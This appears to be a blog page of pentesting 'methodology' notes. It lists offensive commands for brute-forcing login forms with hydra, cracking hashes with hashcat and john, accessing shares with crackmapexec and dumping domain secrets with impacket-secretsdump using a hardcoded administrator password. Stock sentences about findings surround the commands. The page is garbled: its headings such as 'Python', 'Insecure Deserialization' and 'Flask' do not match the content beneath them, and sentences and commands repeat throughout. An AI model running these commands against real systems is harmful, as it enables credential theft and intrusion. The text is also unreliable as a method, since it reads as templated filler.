---
TitleSEO: "Web Application Penetration Testing Methodology | ZureFX"
TitlePost: "Web Application Penetration Testing Methodology"
Author: "ZureFX"
Description: "Personal notes on Web Application Penetration Testing Methodology. Quick reference for pentesting and CTF challenges."
Keywords: "blue team, enumeration, cheatsheet, windows"
URL: "https://zurefx.github.io/notes/note-web-application-penetration-testing-meth-128.html"
URL_IMAGES: ""
Date: "2025-05-19"
Tags: "Blue Team, Enumeration, Cheatsheet, Windows"
Section: "notes"
Lang: "en"
main_img: "note-web-application-penetration-testing-meth-128"
Permalink: "/notes/note-web-application-penetration-testing-meth-128.html"
BtnLabel: "Read Notes"
Pick: 0
---
## Python

### Insecure Deserialization

- `XXE`
- `AS-REP Roasting`
- `NTLM Relay`
- `dcomexec`
- `nikto`
- `Silver Ticket`

Authentication bypass was achieved through careful manipulation of the login mechanism. Privilege escalation was possible due to misconfigured sudo permissions. The backup files contained sensitive information that should not have been accessible.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.64.169.12 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.117.120.69/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.20.168.144 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## sharphound

### Remote File Inclusion

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.60.61.199 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.37.149.34 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
```

Lateral movement was facilitated by reusing discovered credentials across services. The backup files contained sensitive information that should not have been accessible. Post-exploitation enumeration revealed a path to domain administrator privileges. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.22.173.65
```

- `Path Traversal`
- `hydra`
- `ffuf`
- `LAPS Abuse`
- `feroxbuster`
- `Pass the Hash`

Command injection was possible through unsanitized user input in the search functionality. The kernel version was outdated and vulnerable to a publicly known exploit. Group Policy Preferences contained encrypted but recoverable credentials.

## C#

### Ruby on Rails

Post-exploitation enumeration revealed a path to domain administrator privileges. The database credentials were hardcoded in the application source code.

Authentication bypass was achieved through careful manipulation of the login mechanism. The database credentials were hardcoded in the application source code. Command injection was possible through unsanitized user input in the search functionality. The service account had excessive permissions assigned in Active Directory.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
nmap -sCV -p110,27017,80 10.126.17.208 -oN scan.txt
```

## nmap

### Flask

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The application stored sensitive credentials in an unencrypted configuration file. The backup files contained sensitive information that should not have been accessible. The application stored sensitive credentials in an unencrypted configuration file.

Weak file permissions allowed modification of critical system files. Token impersonation allowed elevation to SYSTEM privileges on the target. Authentication bypass was achieved through careful manipulation of the login mechanism.
